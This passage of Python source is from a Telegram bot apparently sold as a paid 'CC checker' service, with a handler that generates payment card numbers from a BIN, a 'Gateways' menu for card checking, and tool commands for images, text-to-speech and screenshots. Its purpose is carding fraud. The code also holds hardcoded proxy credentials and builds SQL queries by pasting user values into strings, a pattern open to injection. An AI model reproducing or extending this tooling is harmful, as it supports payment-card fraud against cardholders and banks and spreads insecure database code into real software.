    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ [ <code>{VerMessage[0:6]}</code> ] {brand} [ {emoji} ]\n- - - - - - - - - - - - - - - - - - - - -\n↯ This bot only accepts American, Visa, Mastercard and Discover. ⚠️ ↯\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if VerMessage:
        from GEN import GeneatedCC
        finalr = str(await GeneatedCC(VerMessage)).split('-')
        listcc = finalr[0]
        extrapcc = finalr[1]

        await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
        result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
        UserStatus =  result['Status']

        if not message.from_user.username: UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>";
        else : UserName = f'@{message.from_user.username}'
        fin = f'{time.time()-inicio}'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        one = InlineKeyboardButton('𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐀𝐠𝐚𝐢𝐧', callback_data="GenerateAgain")
        dos = InlineKeyboardButton('𝐅𝐨𝐫𝐦𝐚𝐭𝐞 𝐌𝐚𝐬𝐬', callback_data="FormateMass")
        tres = InlineKeyboardButton('𝐂𝐥𝐞𝐚𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 🗑️', callback_data="Finish")
        repmarkup = InlineKeyboardMarkup(row_width=3).add(one,dos).add(tres)
        await bot.send_message(
            chat_id=message.chat.id, 
            text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nInfo - ↯ <code>{brand} - {type} - {level} | {bank} [{emoji}]</code>\n- - - - - - - - - - - - - - - - - - - - -\nBin - ↯ <code>{VerMessage[0:6]}</code> | Time - ↯ <code>{fin[0:5]}s</code>\nInput - ↯ <code>{extrapcc}|{mes}|{ano}|{cvv}</code>\n- - - - - - - - - - - - - - - - - - - - -\n{listcc}- - - - - - - - - - - - - - - - - - - - -\nChecked by - ↯ {UserName} [{UserStatus}]</b>",
            reply_to_message_id=message.message_id,
            reply_markup=repmarkup)
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
        return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",", "#"], commands=["cmds","start"])
async def CMDcmds(message: types.Message):
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='upload_video')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError or TypeError:
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))

    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    try :
        one = InlineKeyboardButton('⚾ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ⚾', callback_data="Gateways")
        two = InlineKeyboardButton('🛠️ 𝐓𝐨𝐨𝐥𝐬 🛠️', callback_data="Tools")
        three = InlineKeyboardButton('🧩 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐂𝐫𝐲𝐩𝐭𝐨 🧩', callback_data="Crypto")
        four = InlineKeyboardButton('𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url="https://t.me/alterchk")
        five = InlineKeyboardButton('𝐅𝐢𝐧𝐢𝐬𝐡', callback_data="Finish")
        repmarkup = InlineKeyboardMarkup(row_width=5).add(one, two, three).add(four,five)
        await bot.send_animation(
            animation='https://thumbs.gfycat.com/FickleShadowyBengaltiger-mobile.mp4',
            chat_id=message.chat.id,
            caption=f"<b><i>Hello, To know my commands press any of the buttons!</i></b>",
            reply_to_message_id=message.message_id,
            reply_markup=repmarkup)
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
        return
    except aiogram.utils.exceptions.BadRequest:
        return
@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["img"])
async def CMDsk(message: types.Message):
    NameGateway = 'Tool 🔥 Random Image'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('pfw')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return

    try :
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")

            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return

    async def verificar_palabras(cadena: str) -> bool:
        cadena_validada = re.sub('[^a-zA-ZáéíóúÁÉÍÓÚüÜñÑ0-9]+', ' ', message.text[5:])
        palabras = cadena_validada.split()
        return len(palabras) > 0
    if not await verificar_palabras(message.text[5:]):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>Random Text</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    VerMessage = re.sub('[^a-zA-ZáéíóúÁÉÍÓÚüÜñÑ0-9]+', ' ', message.text[5:])
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='upload_photo')
    except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
        await asyncio.sleep(e.value)
        return
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            repmarkup = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk'))
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")

    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    import os
    import CMDimg
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    archive_jpg = f"Alter「𝑨𝑳𝑮 ﻬ︎」_{random.randint(1,999999)}.jpg"
    text_to_audio = await CMDimg.CMDimg(VerMessage, "http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/", archive_jpg)
    if not (text_to_audio):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>Random Text</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        one = InlineKeyboardButton('𝐀𝐜𝐜𝐞𝐬𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 🔗', url=text_to_audio[1])
        dos = InlineKeyboardButton('𝐂𝐥𝐞𝐚𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 🗑️', callback_data="Finish")
        repmarkup = InlineKeyboardMarkup(row_width=2).add(one,dos)

        async def translate(leng_code, string_to_translate, default_value):
            try:
                from Translate import Translate
                language = leng_code
                lenguage_code = language[0:2].lower()
                return await Translate(lenguage_code, string_to_translate)
            except:
                return default_value

        sr_tr = await translate(message.from_user.language_code, 'Search Results for', 'Search Results for')
        sr_tr2 = await translate(message.from_user.language_code, 'Title', 'Title')
        await bot.send_photo(
            photo=open(archive_jpg, 'rb'),
            chat_id=message.chat.id,
            caption=f"<b>{sr_tr2}:</b> {text_to_audio[0]}\n<b>{sr_tr}:</b> {VerMessage}",
            reply_to_message_id=message.message_id,
            reply_markup=repmarkup)
        os.remove(archive_jpg)
    except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>BadRequest. Check Again!</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    except (aiogram.utils.exceptions.BadRequest):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>Image_process_failed. Check Again!</b>", reply_to_message_id=message.message_id)
            os.remove(archive_jpg)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) :
            return
    except (FileNotFoundError):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>FileNotFoundError. Check Again!</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
           
@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["voz"])
async def CMDsk(message: types.Message):
    NameGateway = 'Tool 🔥 Voice'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('pfw')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return

    try :
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")

            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return

    async def verificar_palabras(cadena: str) -> bool:
        cadena_validada = re.sub('[^a-zA-ZáéíóúÁÉÍÓÚüÜñÑ]+', ' ', cadena)
        palabras = cadena_validada.split()
        return len(palabras) > 0
    if not await verificar_palabras(message.text[5:]):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>Random Text</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    VerMessage = re.sub('[^a-zA-ZáéíóúÁÉÍÓÚüÜñÑ]+', ' ', message.text[5:])
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
        await asyncio.sleep(e.value)
        return
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            repmarkup = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk'))
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")

    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    import io
    from gtts import gTTS
    import os

    async def text_to_audio(text: str) -> io.BytesIO:
        tts = gTTS(text=text, lang='es')
        fp = io.BytesIO()
        tts.write_to_fp(fp)
        fp.seek(0)
        return fp

    async def save_audio(audio_data: bytes, audio) -> None:
        with open(audio, 'wb') as f:
            f.write(audio_data)

    async def main(text: str, audio) -> None:
        audio_data = await text_to_audio(text)
        audio_data = audio_data.read()
        await save_audio(audio_data, audio)

        return True
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='upload_voice')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    archive_mp3 = f"Alter「𝑨𝑳𝑮 ﻬ︎」_{random.randint(1,999)}.mp3"
    text_to_audio = await main(VerMessage, archive_mp3)
    if not (text_to_audio):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>Random Text</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        with open(archive_mp3, 'rb') as f:
            await bot.send_audio(message.chat.id, f, caption=VerMessage)
            os.remove(archive_mp3)
    except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
        await asyncio.sleep(e.value)
        return
    
@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["screen"])
async def CMDsk(message: types.Message):
    AccessSTAFF = await AccessAdmin(message.from_user.id)
    if not AccessSTAFF: return
    NameGateway = 'Tool 🔥 SCREENSHOT'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('pfw')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return

    try :
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")

            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return

    VerMessage = re.sub(r"[\s\n]", "", message.text[7:])
    VerMessage = VerMessage if VerMessage.startswith('https://') else f"https://{VerMessage}"
    async def is_valid_url(url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except ValueError:
            return False
    is_valid_url = await is_valid_url(VerMessage)
    if not (is_valid_url):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>https://www.xxxxxx.com/</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='upload_photo')
    except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
        await asyncio.sleep(e.value)
        return
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            repmarkup = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk'))
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
